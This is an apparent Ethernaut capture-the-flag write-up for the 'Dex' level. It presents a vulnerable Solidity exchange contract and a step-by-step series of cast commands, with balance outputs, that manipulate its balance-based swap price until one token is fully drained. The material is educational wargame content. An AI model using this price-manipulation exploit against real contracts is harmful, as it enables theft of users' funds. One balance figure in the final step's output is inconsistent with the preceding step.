## Dex Level Outline

**Difficulty : 3/10**

The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract Dex  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_price(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_price(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(spender, amount);
    SwappableToken(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x0b0276F85EF92432fBd6529E169D9dE4aD337b1F)

## Solution

Because the exchange rate is based on the ratio of `token1` to `token2`, we can **continouly swap the two tokens for each other** till there one of the tokens have no supply left in the contract due to solidity having no floating points.

### Walkthrough
##### 1. Call the dex's approve function so that we can make the swaps
```console
cast send $LEVEL_ADDRESS "approve(address,uint)" $LEVEL_ADDRESS 1000 --gas 90000 --private-key $PRIVATE_KEY
```

##### 2. Let's find the address of token1 and token2
```console
cast call $LEVEL_ADDRESS "token1()"
```
```console
cast call $LEVEL_ADDRESS "token2()"
```

##### 3. Swap all of our token1 to token2
```console
cast send $LEVEL_ADDRESS "swap(address,address,uint)" $TOKEN1_ADDRESS $TOKEN2_ADDRESS 10 --gas 250000 --private-key $PRIVATE_KEY
```
```
[Our balance after transaction]
token1 : 0
token2 : 20

[Dex balance after transaction]
token1 : 110 
token2 : 90
```

##### 4. Swap all of our token2 to token1
```console
cast send $LEVEL_ADDRESS "swap(address,address,uint)" $TOKEN2_ADDRESS $TOKEN1_ADDRESS 20 --gas 250000 \
--private-key $PRIVATE_KEY
```
```
[Our balance after transaction]
token1 : 24
token2 : 0

[Dex balance after transaction]
token1 : 86 
token2 : 110
```

##### 5. Swap all of our token1 to token2
```console
cast send $LEVEL_ADDRESS "swap(address,address,uint)" $TOKEN1_ADDRESS $TOKEN2_ADDRESS 24 --gas 250000 \
--private-key $PRIVATE_KEY
```
```
[Our balance after transaction]
token1 : 0
token2 : 30

[Dex balance after transaction]
token1 : 110 
token2 : 80
```

##### 6. Swap all of our token2 to token1
```console
cast send $LEVEL_ADDRESS "swap(address,address,uint)" $TOKEN2_ADDRESS $TOKEN1_ADDRESS 30 --gas 250000 \ 
--private-key $PRIVATE_KEY
```
```
[Our balance after transaction]
token1 : 41
token2 : 0 

[Dex balance after transaction]
token1 : 69
token2 : 110
```

##### 7. Swap all of our token1 to token2
```console
cast send $LEVEL_ADDRESS "swap(address,address,uint)" $TOKEN1_ADDRESS $TOKEN2_ADDRESS 41 --gas 250000 \
--private-key $PRIVATE_KEY
```
```
[Our balance after transaction]
token1 : 0
token2 : 65

[Dex balance after transaction]
token1 : 110 
token2 : 45
```

##### 8. We cannot swap 65 `token2` to `token1` as we would expect to receive 158 `token1` in return which is more than the supply in the contract. To drain the contract for all 110 `token1`, we need to swap 45 `token2` to get 110 `token1`
 
```console
cast send $LEVEL_ADDRESS "swap(address,address,uint)" $TOKEN2_ADDRESS $TOKEN1_ADDRESS 45 --gas 250000 \
--private-key $PRIVATE_KEY
```
```
[Our balance after transaction]
token1 : 110
token2 : 20

[Dex balance after transaction]
token1 : 0 
token2 : 90
```

> Dex's token1 supply has now been drained


### [:arrow_left: Back To Main Menu](../)
